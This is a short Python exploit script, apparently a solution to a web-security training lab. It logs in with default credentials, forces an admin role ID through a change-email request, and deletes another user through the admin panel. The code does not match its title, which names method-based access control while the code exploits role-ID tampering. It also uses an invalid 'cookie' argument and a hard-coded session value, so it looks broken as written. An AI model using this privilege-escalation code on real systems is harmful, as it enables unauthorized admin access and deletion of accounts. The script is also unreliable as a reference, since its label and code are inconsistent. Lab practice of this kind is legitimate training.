# Lab:  Method-based access control can be circumvented
import os
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def login(s, url):
    path = "/login"
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    r = s.post(url + path, data=data, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(-> logged in !")
    else:
        print("(-) Couldn't log into user acc")
        exit(-1)


def delete_user(s, url):
    path = "/admin/delete?username=carlos"
    r = s.get(url + path, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(-> User deleted!")
    else:
        print("(-) Couldn't delete user")
        exit(-1)


def change_user_role(s, url):
    login(s, url)
    change_email_path = "/my-account/change-email"
    data = {"email": "wiener@admin-user.org", "roleid": "2"}
    cookie = {"session": "213109he9fh92hf02h2e"}
    r = s.post(url + change_email_path, data=data, cookie=cookie, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(-> Successfully changed role from user to admin!!!")
        delete_user(s, url)
    else:
        print("(-) Couldn't change role")
        exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.Session()
    change_user_role(s, url)


if __name__ == "__main__":
    main()
